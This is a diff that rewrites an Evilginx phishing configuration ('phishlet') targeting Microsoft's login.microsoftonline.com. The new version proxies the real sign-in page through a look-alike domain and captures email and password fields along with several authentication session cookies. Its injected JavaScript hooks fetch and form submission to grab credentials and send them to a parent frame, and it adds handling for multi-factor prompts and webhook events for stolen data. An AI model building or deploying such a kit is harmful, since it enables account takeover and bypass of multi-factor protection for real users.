@@ -1,42 +1,214 @@
-name: 'microsoft'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', phish_sub: '{{.Endpoint2}}', mimes: ['text/html', 'application/javascript', 'application/json']}
-auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-credentials:
-  username:
-    key: 'login'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'login.microsoftonline.com'
-  path: '/'
-js_inject:
-  - trigger_domains: ['login.microsoftonline.com']
-    trigger_paths: ['/.*']
+# Microsoft phishlet for Evilginx v3.3.0
+version: "3.0"
+author: "AuthFlow"
+name: "microsoft"
+
+# Main domain configuration
+domain: "microsoft.com"
+
+# Hosts configuration
+hosts:
+  - hostname: "{{.Endpoint2}}.{{.Domain}}"
+    path: "/"
+    session: true
+    is_landing: true
+  - hostname: "{{.Endpoint2}}.{{.Domain}}"
+    path: "/common"
+    session: true
+  - hostname: "{{.Endpoint2}}.{{.Domain}}"
+    path: "/login"
+    session: true
+  - hostname: "{{.Endpoint2}}.{{.Domain}}"
+    path: "/refreshtoken"
+    session: true
+
+# Phishing configuration
+phish:
+  - domain: "login.microsoftonline.com"
+    path: "/"
+    method: "GET"
+    
+    request_mods:
+      - header: "Host"
+        value: "{{.Endpoint2}}.{{.Domain}}"
+      - header: "Origin"
+        value: "https://{{.Endpoint2}}.{{.Domain}}"
+      - header: "Referer"
+        value: "https://{{.Endpoint2}}.{{.Domain}}/"
+    
+    response_mods:
+      - mime: ["text/html", "application/javascript", "text/javascript"]
+        regex: '(action=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint2}}.{{.Domain}}$2'
+      - mime: ["text/html", "application/javascript", "text/javascript"]
+        regex: '(href=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint2}}.{{.Domain}}$2'
+      - mime: ["text/html", "application/javascript", "text/javascript"]
+        regex: '(src=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint2}}.{{.Domain}}$2'
+      - mime: ["text/html"]
+        regex: '(data-ajax-url=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint2}}.{{.Domain}}$2'
+
+  - domain: "login.microsoftonline.com"
+    path: "/common/oauth2/v2.0/authorize"
+    method: "GET"
+    
+    request_mods:
+      - header: "Host"
+        value: "{{.Endpoint2}}.{{.Domain}}"
+    
+    response_mods:
+      - mime: ["text/html"]
+        regex: '(action=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint2}}.{{.Domain}}$2'
+
+  - domain: "login.microsoftonline.com"
+    path: "/common/SAS"
+    method: "POST"
+    
+    request_mods:
+      - header: "Host"
+        value: "{{.Endpoint2}}.{{.Domain}}"
+
+# Session tokens to capture
+tokens:
+  - name: "ESTSAUTH"
+    domain: ".login.microsoftonline.com"
+    path: "/"
+  - name: "ESTSAUTHPERSISTENT"
+    domain: ".login.microsoftonline.com"
+    path: "/"
+  - name: "SignInStateCookie"
+    domain: ".login.microsoftonline.com"
+    path: "/"
+  - name: "MSISAuth"
+    domain: ".microsoft.com"
+    path: "/"
+  - name: "MSISAuthenticated"
+    domain: ".microsoft.com"
+    path: "/"
+  - name: "MSISLoopDetectionCookie"
+    domain: ".microsoft.com"
+    path: "/"
+
+# Credential capture
+creds:
+  - type: "post"
+    name: "email"
+    key: "loginfmt"
+    pattern: '(.*)'
+  - type: "post"
+    name: "password"
+    key: "passwd"
+    pattern: '(.*)'
+
+# JavaScript injections
+js_injections:
+  - trigger_domains: ["login.microsoftonline.com", "{{.Endpoint2}}.{{.Domain}}"]
+    trigger_paths: ["/.*"]
     code: |
       (function() {
+        'use strict';
+        
+        // Auto-fill email from parameter
         var urlParams = new URLSearchParams(window.location.search);
-        var email = urlParams.get('email');
+        var email = urlParams.get('login');
         if (email) {
-          var emailField = document.querySelector('input[name="login"]');
-          if (emailField) {
-            emailField.value = email;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          var emailInput = document.querySelector('input[name="loginfmt"]');
+          if (emailInput) {
+            emailInput.value = email;
+            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
           }
         }
-      })()
+        
+        // Hook Microsoft login form
+        var originalFetch = window.fetch;
+        window.fetch = function(url, options) {
+          if (options && options.body) {
+            var bodyStr = options.body.toString();
+            if (bodyStr.includes('loginfmt') && bodyStr.includes('passwd')) {
+              var params = new URLSearchParams(bodyStr);
+              var creds = {
+                email: params.get('loginfmt'),
+                password: params.get('passwd')
+              };
+              
+              if (creds.email && creds.password) {
+                if (window.parent !== window) {
+                  window.parent.postMessage({
+                    type: 'credentials',
+                    data: creds,
+                    url: url
+                  }, '*');
+                }
+              }
+            }
+          }
+          return originalFetch.apply(this, arguments);
+        };
+        
+        // Hook form submission
+        var originalSubmit = HTMLFormElement.prototype.submit;
+        HTMLFormElement.prototype.submit = function() {
+          if (this.action && this.action.includes('microsoftonline.com')) {
+            var formData = new FormData(this);
+            var creds = {
+              email: formData.get('loginfmt'),
+              password: formData.get('passwd')
+            };
+            
+            if (creds.email && creds.password) {
+              if (window.parent !== window) {
+                window.parent.postMessage({
+                  type: 'credentials',
+                  data: creds,
+                  url: window.location.href
+                }, '*');
+              }
+            }
+          }
+          return originalSubmit.apply(this, arguments);
+        };
+        
+        // Track "Stay signed in" option
+        var checkbox = document.querySelector('input[type="checkbox"][name="DontShowAgain"]');
+        if (checkbox) {
+          checkbox.addEventListener('change', function() {
+            if (window.parent !== window) {
+              window.parent.postMessage({
+                type: 'preference',
+                key: 'stay_signed_in',
+                value: this.checked
+              }, '*');
+            }
+          });
+        }
+      })();
+
+# Webhook configuration
 webhook:
-  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
+  url: "http://127.0.0.1:{{.AppPort}}/api/webhook/evilginx"
   headers:
-    X-Webhook-Secret: "{{.WebhookSecret}}"
+    "X-Webhook-Secret": "{{.WebhookSecret}}"
+    "Content-Type": "application/json"
   format: "json"
-  events: ["credentials", "session"]
+  events:
+    - "creds"
+    - "session"
+    - "auth"
+    - "mfa"
+
+# Redirect after successful login
+redirect_url: "https://outlook.live.com"
+
+# 2FA/MFA handling
+two_factor:
+  enabled: true
+  detect_patterns:
+    - "authenticator"
+    - "verification code"
+    - "text message"
+    - "approve"
+    - "phone"
+  redirect_after: "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
